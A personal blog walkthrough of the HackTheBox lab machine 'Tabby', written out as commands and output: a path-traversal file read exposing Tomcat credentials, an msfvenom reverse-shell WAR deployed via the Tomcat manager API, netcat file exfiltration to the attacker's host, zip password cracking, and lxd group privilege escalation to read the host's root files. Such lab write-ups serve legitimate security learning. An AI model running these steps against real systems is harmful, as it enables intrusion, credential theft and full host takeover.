---
title: HackTheBox Tabby Write-Up
tags: 
- hackthebox
- writeup
image: /images/tabby/info.png
---

Welcome to the "shortest box I have ever solved on hackthebox" write-up. By shortest I mean it took me just about day to solve this one. Short or not, it taught me a lot (*sick rhymes I know*). But that was not just to make a rhyme, I genuinely learned new stuff at literally every stage, be it foothold, user or root! Things like tomcat, cracking zip files and lxd group were a news to me. So for the shortest box lets keep this short and start!

<!--more-->

<img src="/images/tabby/info.png" >

Ohh... And did I tell you about the new badge I got? Thats right I have finally attained the hacker badge and since you are probably looking at this in the future it may differ ;)

<script src="https://www.hackthebox.eu/badge/242038"></script> 

Anywho...Kicking off the nmap scan.

```
nmap -T4 -Pn -v 10.10.10.194

Starting Nmap 7.60 ( https://nmap.org ) at 2020-09-11 17:11 IST
Completed Connect Scan at 17:12, 24.66s elapsed (1000 total ports)
Nmap scan report for 10.10.10.194
Host is up (0.20s latency).
Not shown: 995 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
1782/tcp filtered hp-hcip
8080/tcp open     http-proxy
8443/tcp open     https-alt
```

So we have a SSH and two web sites, one on port 80 and another on 8080. Visiting the one on port 80.

<img src="/images/tabby/website.png" width="1000"/>

Looking around we don't find anything interesting other than a link that takes us to a page with statement about a breach that happened. But first to open that link we need to add an entry in the `/etc/hosts` file 

```
10.10.10.194   megahosting.htb
```

Now we when we open the link we see.

<img src="/images/tabby/news.png" width="1000" />

Immediately my eyes were fixed on the the url. DO you see it? that filename parameter? It is opening a file named statement and I had Local File Inclusion ringing in my ears. So lets try the file which is present in all linux machines. 

<img src="/images/tabby/etcpasswd.png" width="1000"/>

And I just had a dopamine rush. I try some other well known files but no success. Lets try the other website on port 8080.

<img src="/images/tabby/tomcat.png" />

We find a default installation of tomcat9. I try clicking around on some links and find that I need credentials for pages like host-manager. First I try bruteforcing it with default creds but no luck. 

Some research tells us that the creds for tomcat are stored inside a file named "tomcat-users.xml". Let the games begin! 

I knew we need to use the LFI to find the creds file and lets just start with saying that anything that told us about the paths where that file is stored was a big fat lie. I spent a good 3 hours trying every path for that file  I could find on the internet. Someone recommended that I take a look at the package amanger used. So we know that the system is running ubuntu( browsing to non existant pages disclosed that in the form of an error). 

So the package manager used should be "apt". Lets try installing tomcat9 with apt. After that I cruised around in my machine and looked for the tomcat-users.xml file. Finally I found it inside "/usr/share/tomcat9/etc/". (I am not showing that process because it is not relevant) 

So I try this in the browser and...

<img src="/images/tabby/blank.png" width="1000"/>

Alright...\**breathes in*\* GODDAMMIT! I AM GIVING UP! I just went haywire after that and I don't know why but I decided to take a look at the source html of the blank page. Guess what? I did see some code. But why? Well because apparently xml code does not show anything in a browser. I decided to curl it.

```
curl http://megahosting.htb/news.php?file=/../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
<!--
  NOTE:  By default, no user is included in the "manager-gui" role required
  to operate the "/manager/html" web application.  If you wish to use this app,
  you must define such a user - the username and password are arbitrary. It is
  strongly recommended that you do NOT use one of the users in the commented out
  section below since they are intended for use with the examples web
  application.
-->
<!--
  NOTE:  The sample user and role entries below are intended for use with the
  examples web application. They are wrapped in a comment and thus are ignored
  when reading this file. If you wish to configure these users for use with the
  examples web application, do not forget to remove the <!.. ..> that surrounds
  them. You will also need to set the passwords to something appropriate.
-->
<!--
  <role rolename="tomcat"/>
  <role rolename="role1"/>
  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
  <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
   <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

We can see the sweet sweet creds at the end of file as well as our privileges. After that I am off to find an exploit for a user with our privileges in tomcat. I find an [awesome article](https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00) with step by step instructions. 

So the exploit is easy. Since we have the manager-script privilege we can use the tomcat API to upload any file that we want. We will be uploading  malicious .WAR(web application resource) file. So a WAR file to a tomcat server is what php is to a apache server(thats how I understood it anyway). It is a web application but written in java. We will upload the file and when we browse to it we will get a connection back to our netcat listener.

Creating a malicious war file with msfvenom.
```
msfvenom -p java/shell_reverse_tcp lhost=YourIP lport=1234 -f war -o pwn.war
```

And then upload the file using tomcat API.

```
curl -v -u tomcat:\$3cureP4s5w0rd123! --upload-file pwn.war http://10.10.10.194:8080/manager/text/deploy?path=/example&update=true
```

**Remember that we will use a backslash as a escape mechanism in the front of our password because it contains a "`$`" which can be interpreted by the terminal as a variable and that will mess up our command.**

Next just start a netcat listener and browse to the path you provided when uploading the file.

```
curl http://10.10.10.194:8080/example


nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from megahosting.htb 54708 received!
python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@tabby:/var/lib/tomcat9$ whoami
whoami
tomcat
tomcat@tabby:/var/lib/tomcat9$ id
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
```

Now we are tomcat user and next we need to get the "ash" user. So now I perform the basic piv esc methods without any luck. Only option left is look around for juicy files. I spent good amount of time here too. 

Lets skip my frustration and get right to the main point. The only file I could find that belonged to the user ash was a password protected zip file. So I download it to my machine using a fancy trick I learned recently. Take a look.

```
tomcat@tabby:/var/www/html/files$ ls -al
ls -al
total 36
drwxr-xr-x 4 ash  ash  4096 Jun 17 21:59 .
drwxr-xr-x 4 root root 4096 Jun 17 16:24 ..
-rw-r--r-- 1 ash  ash  8716 Jun 16 13:42 16162020_backup.zip
drwxr-xr-x 2 root root 4096 Jun 16 20:13 archive
drwxr-xr-x 2 root root 4096 Jun 16 20:13 revoked_certs
-rw-r--r-- 1 root root 6507 Jun 16 11:25 statement

tomcat@tabby:/var/www/html/files$ nc YourIP 5678 < 16162020_backup.zip

nc -lvnp 5678 > backup.zip
```

The second last line is to be executed on the target machine and the last line is for our attacking machine. 

Now we have the zip file I try to crack it using a new tool called fcrackzip.

```
fcrackzip -D -u -v -p  ~/tools/rockyou.txt backup.zip
'var/www/html/assets/' is not encrypted, skipping
found file 'var/www/html/favicon.ico', (size cp/uc    338/   766, flags 9, chk 7db5)
'var/www/html/files/' is not encrypted, skipping
found file 'var/www/html/index.php', (size cp/uc   3255/ 14793, flags 9, chk 5935)
found file 'var/www/html/logo.png', (size cp/uc   2906/  2894, flags 9, chk 5d46)
found file 'var/www/html/news.php', (size cp/uc    114/   123, flags 9, chk 5a7a)
found file 'var/www/html/Readme.txt', (size cp/uc    805/  1574, flags 9, chk 6a8b)
checking pw arizon09                                

PASSWORD FOUND!!!!: pw == admin@it
admin@it
```

-D is to use wordlist attack, -v is for verbose output, -p is for giving it a wordlist and -u is used to unzip using the unzip command.

We now have the password for the zip file. When I extract it I don't find anything valuable **but** we do have a password now so lets try it to change our user to ash. 

```
tomcat@tabby:/var/www/html/files$ su ash                              
su ash
Password: admin@it

ash@tabby:/var/www/html/files$ whoami
whoami
ash
ash@tabby:/var/www/html/files$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Now unlike my past mistakes this time I started with the "id" command to check for any interesting groups that I am part of. And it paid off with some googling I find that there is a priv esc method for the users that are in the lxd group.

LXC (linux containers) is just another container technology like docker. It is used to create isolated environments with all the dependencies present. For more background information on what is all this and how is it usefull to us as well as the steps required to exploit it I found an [awesome article](https://www.hackingarticles.in/lxd-privilege-escalation/).

This article has about everything you will need to exploit the root part of this box. Here is my understanding of the exploit:

Lxd is a root process. Anyone in the lxd group can use the process as root user (so like SUID binaries right?). So first we create our own lxd image/container. We then transfer it to the target machine. After that we set the `security.privileged=true` which allows the root user of the container access to the actual root of the host. Remember that we are in the group of lxd and so we can can perform all these actions without the need for sudo. Next we mount the the whole system files inside our container meaning that we take the whole host file system and make a copy of it inside our container. From there we can then browse all the data inside all the directories that we don't even have the permission to read.
I think performing the exploit will make more sense so lets do that now.

[Reference](https://ubuntu.com/server/docs/containers-lxd)

Like instructed in the [article](https://www.hackingarticles.in/lxd-privilege-escalation/) we first git clone the [repository](https://github.com/saghul/lxd-alpine-builder.git) and run the script inside it as root.

Next we transfer the thus generated file which looks kinda like `alpine-v3.12-x86_64-20200913_1159.tar.gz`. After transferring it to the target machine we do the following steps.

```
lxc image import alpine-v3.12-x86_64-20200913_1159.tar.gz --alias myimage

lxc image list
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+
| myimage | d672a8b5660e | no     | alpine v3.12 (20200913_11:42) | x86_64       | CONTAINER | 3.05MB | Sep 13, 2020 at 10:04am (UTC) |
+---------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+

lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
~ # whoami
whoami
root

```

- In the first command we import our created container.
- Next we list out all the containers and we can see ours in there.
- Next we set the privileges of the container according to the above explaination
- Then we mount the whole file system of the host inside our container
- Now we just start the container and get a shell inside it.
- We are the root user of the container. (Not the host!)

Next steps are easy

```
~ # cd /mnt/root
cd /mnt/root
/mnt/root # ls       
ls
bin         home        lost+found  root        swap.img
boot        lib         media       run         sys
cdrom       lib32       mnt         sbin        tmp
dev         lib64       opt         snap        usr
etc         libx32      proc        srv         var

cd root
/mnt/root/root # ls       
ls
root.txt  snap
```

Just browse to the point where we mounted the file system and we can read all the data including the data inside the root directory. And that is how we read the root flag.

I know I might have confused you even more but I never said that I am a good teacher. There are a lot of good articles on this topic since it is a pretty popular exploit so I recommend reading those instead. 

\*insert ending speech here\* 